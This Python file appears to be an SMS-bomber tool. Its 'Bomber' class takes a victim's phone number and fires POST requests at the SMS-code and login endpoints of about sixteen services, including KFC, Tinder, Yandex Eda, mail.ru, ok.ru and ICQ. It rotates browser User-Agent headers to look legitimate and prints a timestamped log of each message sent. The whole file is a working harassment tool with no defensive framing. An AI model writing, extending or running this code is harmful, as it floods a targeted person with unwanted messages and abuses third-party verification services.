from random import choice
from requests import post
from datetime import datetime

green = '\033[92m'
cyan = '\033[95m'
bold = '\033[1m'
underline = '\033[4m'
end = '\033[0m'
red = '\033[91m'


class Bomber:
    def __init__(self, number):
        self.number_7 = '7' + number
        self.number_plus7 = '+7' + number
        self.number_8 = '8' + number

        self.headers = [
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
                'Accept': '*/*'
            },
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
                'Accept': '*/*'
            },
            {
                "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
                'Accept': '*/*'
            },
        ]

        self.url_data = [
            {'url': 'https://api.sunlight.net/v3/customers/authorization/',
             'data': {'phone': self.number_7}},
            {'url': "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
             'json': {"phone": self.number_7}},
            {'url': 'https://cloud.mail.ru/api/v2/notify/applink', 'json': {
                "phone": self.number_plus7, "api": 2, "email": "email", "x-email": "x-email"}},
            {'url': 'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
             'json': {'phone': self.number_plus7}},
            {'url':  'https://b.utair.ru/api/v1/login/',
             'data': {'login': self.number_8}},
            {'url':  'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
             'data': {"phone_number": self.number_7}},
            {'url':
             'https://www.citilink.ru/registration/confirm/phone/+' + self.number_7 + '/'},
            {'url':  "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
             'data': {"st.r.phone": self.number_plus7}},
            {'url':  'https://app.karusel.ru/api/v1/phone/',
             'data': {"phone": self.number_7}},
            {'url':  'https://youdrive.today/login/web/phone', 'data': {
                'phone': number, 'phone_code': '7'}},
            {'url':  'https://api.mtstv.ru/v1/users',
             'json': {'msisdn': self.number_7}},
            {'url':  'https://youla.ru/web-api/auth/request_code',
             'json': {"phone": self.number_plus7}},
            {'url':  'https://eda.yandex/api/v1/user/request_authentication_code',
             'json': {"phone_number": self.number_plus7}},
            {'url':  "https://api.ivi.ru/mobileapi/user/register/phone/v6",
             'data': {"phone": self.number_7}},
            {'url':  "https://api.delitime.ru/api/v2/signup", 'data': {
                "SignupForm[username]": self.number_7, "SignupForm[device_type]": 3}},
            {'url':  'https://www.icq.com/smsreg/requestPhoneValidation.php', 'data': {
                'msisdn': self.number_7, "locale": 'en', 'countryCode': 'ru', 'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}}
        ]

    def report(self, service, response):
        time = datetime.now().strftime('%H:%M:%S')
        msg1 = f"{green}{bold}{str(time)}{end}"
        msg2 = f"{green}{bold}[{str(service)}]{end} {'sent!' if response.ok else 'tried!'}"

        print(f"{msg1}     {msg2}")

    def attack(self, sms):
        print("-" * 33)
        print(
            f"|  {green}{bold}  amount   {end} | {green}{bold}     time     {end} |")
        print("-" * 33)
        for counter, pair in enumerate(self.url_data, 1):
            service = pair['url'].split('://')[-1].split('/')[0]
            self.report(service, post(**pair, headers=choice(self.headers)))
            if counter == sms:
                quit()
